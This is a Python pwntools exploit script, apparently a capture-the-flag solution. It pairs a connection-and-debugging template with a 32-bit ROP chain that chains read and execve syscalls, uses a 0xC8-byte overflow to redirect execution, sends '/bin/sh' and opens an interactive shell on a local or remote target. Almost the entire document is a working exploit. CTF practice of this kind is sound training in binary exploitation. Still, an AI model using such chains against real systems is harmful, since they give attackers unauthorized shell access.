from pwn import *
import LibcSearcher
import sys

#Init Space
file = './pwn'
#libc = ELF("./libc.so")
gdb_plugin = '/home/mindedness/pwn'

#=====================================================  
elf = ELF(file)

context.binary = elf
context.os = 'linux'
IsGDB = ''

if 'remote' in sys.argv or 'REMOTE' in sys.argv:
    print('<Host Port> or <nc Host Port>')
    Remote_Setting = input().split()
    if 'nc' in Remote_Setting:
        Remote_Setting.remove('nc')
    for _ in range(0,len(Remote_Setting)):
        item = Remote_Setting[0]
        Remote_Setting.remove(item)
        if ':' in item:
            Remote_Setting.extend(item.split(':'))
        else:
            Remote_Setting.append(item)
    if ':' in Remote_Setting:
        Remote_Setting.remove(':')
    while '' in Remote_Setting:
        Remote_Setting.remove('')
    host, port = Remote_Setting
    port = int(port)    
    io = remote(host, port)
    GDB = lambda: 1 == 1
else:
    io = process(file)
    print("Debug Mode? Y/N (yes/no)")
    IsDebug = input().lower()
    print("Start GDB? Y/N (yes/no)")
    IsGDB = input().lower()
    if IsDebug == 'yes' or IsDebug == 'y':
        context.log_level = 'debug'
        
    if IsGDB == 'yes' or IsGDB == 'y':
        context.terminal = ['tmux', 'split-window', '-v', '-t', '0']
        tty_0 = subprocess.check_output([
            'tmux', 'display-message', '-p', '#{pane_tty}'
        ]).decode().strip()
        tty_1, pane_id_1 = subprocess.check_output([
            'tmux', 'split-window', '-h', '-P', '-F', '#{pane_tty} #{pane_id}', 'cat -'
        ]).decode().strip().split()  
        
        gdb_script = f"""
        set context-output {tty_1}
        define hook-quit
            shell tmux kill-pane -t {pane_id_1}
        end
        
        rename_import ./.rename
        """

        print(gdb_script)
        GDB = lambda: gdb.attach(io, gdb_script)
    else:
        io = process(file)
        GDB = lambda: 1 == 1


if elf.arch == 'i386':
    B = 4
    unpk = lambda unpack : u32(unpack.ljust(B,b'\x00'))
    dopk = lambda dopack : p32(dopack)
elif elf.arch == 'amd64':
    B = 8
    unpk = lambda unpack : u64(unpack.ljust(B,b'\x00'))
    dopk = lambda dopack : p64(dopack)
else:
    B = int(input("Input Address Byte: "))

success(f"Arch = {elf.arch} || B = {B}")

# 函数绑定
int_to_byte = lambda numbers=0 : str(numbers).encode('utf-8')
find = lambda gadget : next(elf.search(gadget))

sla = lambda rcv, snd: io.sendlineafter(rcv, snd)
sl  = lambda snd: io.sendline(snd)
sa  = lambda rcv, snd: io.sendafter(rcv, snd)
rcv = lambda num, t=Timeout.default: io.recv(num, t)
rcu = lambda stop, drop=False, t=Timeout.default: io.recvuntil(stop, drop, t)
SHELL = lambda: io.interactive()
#=====================================================  



name = 0x80EF320
buf = 0x80EF300

payload = flat([
    #name+4,
    find( asm("pop eax; ret") ),
    0x03, #read syscall number
    find( asm("pop ebx; ret") ),
    0,
    find( asm("pop ecx; ret") ),
    buf,
    find( asm("pop edx; ret") ),
    8,
    find( asm("int 0x80; ret") ),
    # read(0,buf,8);
    
    find( asm("pop eax; ret") ),
    0x0b, #execve syscall number
    find( asm("pop ebx; ret") ),
    buf,
    find( asm("pop ecx; ret") ),
    0,
    find( asm("pop edx; ret") ),
    0,
    find( asm("int 0x80; ret") )
    # execve(buf,0,0);
])
context.log_level= "Debug"
rcu(b"name?")
sl(payload)


padding = 0xC8
payload = flat([
    b"A"*padding,
    name+4
])
GDB()
rcu(b"right?")
sl( payload )

sl(b"/bin/sh\x00")

SHELL()